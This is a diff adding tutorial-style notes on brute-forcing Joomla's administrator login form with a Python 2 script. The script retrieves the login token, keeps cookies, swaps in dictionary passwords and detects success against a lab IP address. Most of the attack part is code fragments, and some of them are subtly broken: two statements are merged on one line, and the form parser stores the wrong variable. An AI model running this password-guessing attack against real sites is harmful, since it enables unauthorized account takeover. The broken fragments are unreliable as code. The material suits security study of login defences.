@@ -1,0 +1,94 @@
+[Brute-Forcing HTML Form Authentication]
+
+There are a number of brute forcers that can do the brute-forcing of a POST request to the login script, 
+but in a lot of cases they are not flexible enough to deal with dynamic content or handle simple “are you human" checks. 
+
+Modern Joomla systems include some basic anti-brute-force techniques, 
+but still lack account lockouts or strong captchas by default.
+
+To brute-force Joomla, there are two requriements:
+1. Retrieve the login token from the login form before submitting the password attempt
+2. Accept cookies in our urllib2 session. 
+
+We can use HTMLParser which is a Python class, in order to parse out the login form values.
+(This will also be a good whirlwind tour of some additional features of urllib2 that you can employ when building tooling for your own targets.)
+
+We have to use the following request flow in our brute forcer in order to be successful against Joomla:
+1. Retrieve the login page, and accept all cookies that are returned.
+2. Parse out all of the form elements from the HTML.
+3. Set the username and/or password to a guess from our dictionary.
+4. Send an HTTP POST to the login processing script including all HTML form fields and our stored cookies.
+5. Test to see if we have successfully logged in to the web application.
+
+[In the python code]
+The "target_url" is where our script will first download and parse the HTML. 
+The "target_post" is where we will submit our brute-forcing attempt. 
+    target_url  = "http://192.168.112.131/administrator/index.php"
+    target_post = "http://192.168.112.131/administrator/index.php"
+
+Set the username_field and password_field variables to the appropriate name of the HTML elements.
+    username_field= "username"
+    password_field= "passwd"
+
+Using this code, Check for after each brute-forcing attempt, whether we are successful or not.
+    success_check = "Administration - Control Panel"
+
+brute-forcing class will handle all of the HTTP requests and manage cookies.
+    class Bruter(object): 
+        (...    ...     ...     ...     ...     ...     ...     ...     ...)
+        (...    ...     ...     ...     ...     ...     ...     ...     ...)
+
+After we grab our password attempt, Set up our cookie jar using the FileCookieJar class which store the cookies in the cookies file. 
+Then, initialize urllib2 opener, passing in the initialized cookie jar, which tells urllib2 to pass off any cookies to it. 
+Make the initial request to retrieve the login form. 
+    brute = self.password_q.get().rstrip()
+    jar = cookielib.FileCookieJar("cookies")
+    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))response = opener.open(target_url)
+    page = response.read()
+    print "Trying: %s : %s (%d left)" % (self.username,brute,self.
+    password_q.qsize())
+
+When we have the raw HTML, we pass it off to HTML parser and call its feed method, 
+which returns a dictionary of all of the retrieved form elements
+    parser = BruteParser()
+    parser.feed(page)   
+    post_tags = parser.tag_results
+
+Replace the username and password fields with our brute-forcing attempt
+    post_tags[username_field] = self.username
+    post_tags[password_field] = brute
+
+URL encode the POST variables, pass them in subsequent HTTP request   
+    login_data = urllib.urlencode(post_tags)
+    login_response = opener.open(target_post, login_data)
+    login_result = login_response.read()
+
+Check it's successful or not
+    if success_check in login_result:
+        self.found = True
+        print "[*] Bruteforce successful."
+        print "[*] Username: %s" % username
+        print "[*] Password: %s" % brute
+        print "[*] Waiting for other threads to exit..."
+
+* implement the core of our HTML processing
+Create the directory to store results.
+    def __init__(self):
+        HTMLParser.__init__(self)
+        self.tag_results = {}
+
+handle_starttag function is called whenever a tag is encountered.
+Looking for HTML input tags, then keep finding a name or value which is same with code, 
+it associates them in the tag_results dictionary
+    def handle_starttag(self, tag, attrs):
+        if tag == "input":
+            tag_name = None
+            tag_value = None
+            for name,value in attrs:
+                if name == "name":
+                    tag_name = value
+                if name == "value":
+                    tag_value = value
+
+            if tag_name is not None:
+                self.tag_results[tag_name] = value
